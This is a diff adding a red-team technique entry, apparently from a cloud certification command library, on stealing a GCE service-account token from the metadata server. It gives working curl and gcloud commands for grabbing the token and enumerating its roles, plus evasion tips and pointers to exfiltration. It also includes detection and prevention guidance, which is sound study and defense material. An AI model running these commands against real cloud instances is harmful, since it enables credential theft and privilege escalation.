@@ -1,0 +1,102 @@
+{
+  "id": "gcp-metadata-token",
+  "name": "GCP Compute SA Token Theft (Metadata Server)",
+  "command": "curl -s -H \"Metadata-Flavor: Google\" \"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\"",
+  "description": "From code execution on (or header-controlling SSRF against) a GCE VM, pull the attached service account's OAuth access token from the metadata server, then use it with gcloud. Compute default SAs are frequently over-privileged (Editor), so this is a prime privilege-escalation / lateral-movement pivot.",
+  "type": "command",
+  "platform": "multi",
+  "requires": [
+    "shell"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "curl",
+    "gcloud"
+  ],
+  "tags": [
+    "gcp",
+    "metadata",
+    "token-theft",
+    "service-account",
+    "privilege-escalation",
+    "ssrf",
+    "mcrta"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Cloud - GCP",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "MCRTA (CyberWarFare Labs) - Multi-Cloud Red Team Analyst: GCP",
+  "examples": [
+    {
+      "label": "Grab the attached SA's access token",
+      "command": "curl -s -H \"Metadata-Flavor: Google\" \"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\""
+    },
+    {
+      "label": "List available SAs + scopes on the instance",
+      "command": "curl -s -H \"Metadata-Flavor: Google\" \"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/\"\ncurl -s -H \"Metadata-Flavor: Google\" \"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes\""
+    },
+    {
+      "label": "Use the stolen token with gcloud",
+      "command": "echo -n '<access_token>' > token.txt\ngcloud projects list --access-token-file token.txt"
+    },
+    {
+      "label": "Check the SA's roles, then act",
+      "command": "gcloud projects get-iam-policy <project_id> --flatten=\"bindings[].members\" --filter=\"bindings.members=serviceAccount:<compute_sa_email>\" --format=\"value(bindings.role)\""
+    }
+  ],
+  "notes": "The GCE metadata server (169.254.169.254 / metadata.google.internal) requires the 'Metadata-Flavor: Google' header - this blocks naive SSRF but NOT header-controlling SSRF, and any RCE on the box reaches it directly. Path .../service-accounts/default/token returns a short-lived OAuth token scoped by the instance's access scopes (legacy default scope 'cloud-platform' or restricted scopes limit what the token can do - check .../default/scopes). The default Compute Engine SA (PROJECTNUM-compute@developer.gserviceaccount.com) is Editor by default = huge. Classic chain: web SSRF/RCE on a GCE VM -> metadata token -> gcloud with the SA -> enumerate/exfil/escalate.",
+  "references": [
+    {
+      "title": "CyberWarFare Labs - MCRTA",
+      "url": "https://cyberwarfare.live/product/multi-cloud-red-team-analyst-mcrta/"
+    },
+    {
+      "title": "Google Cloud - VM metadata server",
+      "url": "https://cloud.google.com/compute/docs/metadata/overview"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "gcp-storage-exfil",
+      "rel": "next",
+      "note": "Exfil SA keys/data from storage with the token"
+    },
+    {
+      "id": "gcp-iam-enum",
+      "rel": "next",
+      "note": "Enumerate what the stolen SA can do"
+    },
+    {
+      "id": "ssrf-exploit",
+      "rel": "alternative",
+      "note": "Header-controlling SSRF can reach the metadata server"
+    }
+  ],
+  "opsec": "moderate",
+  "exam": "exam-ok",
+  "mitre": [
+    "T1552.005",
+    "T1078.004"
+  ],
+  "defense": {
+    "why_it_works": "A GCE VM's attached service account can retrieve OAuth tokens from the local metadata server with no secret. Any code (or header-controlling SSRF) on the instance gets a token and acts as the SA, inheriting its IAM roles - which for the default Compute SA is typically project Editor, far more than the workload needs.",
+    "prerequisites": "Code execution on, or header-setting SSRF against, a GCE VM that has an attached service account (default or user-managed) with meaningful IAM roles and broad access scopes.",
+    "impact": "T1552.005 Unsecured Credentials: Cloud Instance Metadata API + T1078.004 Valid Accounts: Cloud Accounts. Attacker operates as the instance SA across GCP APIs - privilege escalation and lateral movement into the project.",
+    "detection": "Cloud Audit Logs: instance SA performing API calls inconsistent with the workload / from unusual sequences; token used for storage/IAM actions the app never does. VPC/SSRF: web requests to 169.254.169.254 or metadata.google.internal in app logs.",
+    "artifacts": "Audit Log entries by the compute SA principal; app/web logs showing metadata requests.",
+    "prevention": "Attach a least-privilege, purpose-built service account (never leave the default Editor SA). Set restricted access scopes. Enable metadata concealment / use GKE Workload Identity so pods can't read the node SA token. Fix SSRF (block link-local 169.254.0.0/16 egress, allowlist). Monitor SA usage anomalies.",
+    "evasion": "Use the short-lived token promptly, only for actions the SA normally performs, from the instance's expected context.",
+    "sources": [
+      "MCRTA GCP",
+      "https://attack.mitre.org/techniques/T1552/005/"
+    ],
+    "misconfiguration": "Default Compute Engine SA (Editor) attached with the legacy 'cloud-platform' scope on an internet-facing VM; SSRF that can set headers.",
+    "vulnerable_config": "# Default SA (Editor) + broad scope + SSRF/RCE:\ncurl -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+    "secure_config": "# Attach a dedicated least-privilege SA with narrow scopes (not the default Editor SA).\n# Enable metadata concealment / GKE Workload Identity; block workload egress to 169.254.169.254;\n# remediate SSRF; alert on anomalous SA API usage."
+  }
+}
